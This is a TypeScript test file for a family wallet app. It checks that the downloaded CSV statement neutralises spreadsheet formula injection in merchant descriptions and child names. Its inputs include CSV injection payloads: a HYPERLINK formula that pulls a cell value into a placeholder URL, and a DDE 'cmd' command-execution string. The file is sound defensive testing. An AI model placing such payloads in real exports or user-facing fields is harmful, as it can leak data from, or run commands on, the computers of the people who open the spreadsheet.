import { describe, expect, it } from 'vitest';
import { toStatementCsv, type ActivityTxn } from '@/lib/wallet/activity';

/**
 * "Download statement" wrote whatever a ledger row's description said into the
 * CSV, quoting only commas, quotes and newlines. A cell that begins with
 * = + - @ (or a tab or carriage return) is a FORMULA to Excel, Sheets and
 * Numbers, and the descriptions are other people's words: a card purchase is
 * described by the merchant's own name (Stripe `merchant_data.name`), a spend
 * request by whoever asked. So `=HYPERLINK("https://…?"&B2,"Open")` in a
 * description became a live link — or worse — in the parent's spreadsheet.
 *
 * The support-ticket export already guards this (lib/admin/tickets-csv.ts,
 * C1-S9-105): an apostrophe in front makes the cell text. The statement now
 * does the same to the cells people write — Description and Child — and to no
 * others: Amount and Balance are the app's own signed numbers, and "-0.50"
 * has to stay a number a spreadsheet can sum.
 */

const row = (over: Partial<ActivityTxn> & { childName?: string | null }): ActivityTxn & { childName?: string | null } => ({
  id: 'r1', child_wallet_id: 'c1', type: 'card_spend', status: 'completed', direction: 'debit',
  amount_cents: 50, description: 'Snacks', created_at: '2026-06-25T14:30:00Z', childName: 'Mia', ...over,
});

/** Split one CSV data line into cells, honouring RFC 4180 quoting. */
function cells(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < line.length; i += 1) {
    const ch = line[i];
    if (quoted) {
      if (ch === '"' && line[i + 1] === '"') { cur += '"'; i += 1; } else if (ch === '"') quoted = false; else cur += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { out.push(cur); cur = ''; } else cur += ch;
  }
  out.push(cur);
  return out;
}

const COL = { description: 3, child: 4, amount: 6, balance: 8 } as const;
const dataLine = (r: ActivityTxn & { childName?: string | null }) => cells(toStatementCsv([r]).split('\r\n')[1]);

describe('a description someone else wrote is text, not a formula', () => {
  it.each([
    ['=HYPERLINK("https://example.test/?"&B2,"Open")'],
    ['+1+cmd|\' /C calc\'!A0'],
    ['-2+3'],
    ['@SUM(A1:A9)'],
    ['\tTAB-LED'],
    ['\rCR-LED'],
  ])('%j is written with an apostrophe in front', (description) => {
    expect(dataLine(row({ description }))[COL.description]).toBe(`'${description}`);
  });

  it('the same goes for the child column', () => {
    expect(dataLine(row({ childName: '=1+1' }))[COL.child]).toBe("'=1+1");
  });

  it('a merchant name that is a formula and has a comma is still one quoted cell', () => {
    const line = toStatementCsv([row({ description: '=A1,B1' })]).split('\r\n')[1];
    expect(line).toContain(`"'=A1,B1"`);
    expect(cells(line)).toHaveLength(9);
  });
});

describe('a formula cannot start a cell anywhere a spreadsheet may start one', () => {
  // Excel in the semicolon locales the app ships (de-DE, fr-FR, it-IT, nl-NL,
  // es-ES, pt-PT) splits a .csv at `;`, and its text-import wizard splits at
  // tab, so a cell also begins after either — not only where this CSV puts one.
  // A gift giver's name is free text ("Gift received from <name>"), so
  // `x;=cmd|…` reached a cell of its own past a first-character-only guard.
  const splitOn = (line: string, sep: string) => line.split(sep);

  it.each([
    ['a semicolon', 'Gift received from x;=HYPERLINK("https://example.test")', ';'],
    ['a tab', 'Lunch\t+1+1', '\t'],
    ['a semicolon then a tab', 'x;\t=1+1', '\t'],
  ])('after %s, the next cell is text', (_label, description, sep) => {
    const line = toStatementCsv([row({ description })]).split('\r\n')[1];
    for (const cell of splitOn(line, sep).slice(1)) expect(cell).not.toMatch(/^\s*[=+\-@]/);
  });

  it('after a line break inside the cell, the next line is text too', () => {
    const line = toStatementCsv([row({ description: 'first\n=1+1' })]).split('\r\n')[1];
    expect(line).toContain("\n'=1+1");
  });

  it('leading spaces do not hide a formula from a reader that trims them', () => {
    expect(dataLine(row({ description: '  =1+1' }))[COL.description]).toBe("'  =1+1");
  });

  it('the guard says nothing about an ordinary semicolon or tab', () => {
    expect(dataLine(row({ description: 'Books; pens\tand paper' }))[COL.description]).toBe('Books; pens\tand paper');
  });
});

describe('everything else is left exactly as it was', () => {
  it('an ordinary description and name are untouched', () => {
    const line = dataLine(row({ description: 'Corner Books', childName: 'Mia' }));
    expect(line[COL.description]).toBe('Corner Books');
    expect(line[COL.child]).toBe('Mia');
  });

  it('a formula character anywhere but the start is just a character', () => {
    expect(dataLine(row({ description: 'Snacks = $5 + tax @ store' }))[COL.description]).toBe('Snacks = $5 + tax @ store');
  });

  it('a debit amount and a negative balance stay numbers a spreadsheet can sum', () => {
    const line = dataLine(row({ amount_cents: 50, direction: 'debit' }));
    expect(line[COL.amount]).toBe('-0.50');
    expect(line[COL.balance]).toBe('-0.50');
  });

  it('an empty description and a missing child are empty cells, not an apostrophe', () => {
    const line = dataLine(row({ description: null, childName: null }));
    expect(line[COL.description]).toBe('');
    expect(line[COL.child]).toBe('');
  });
});
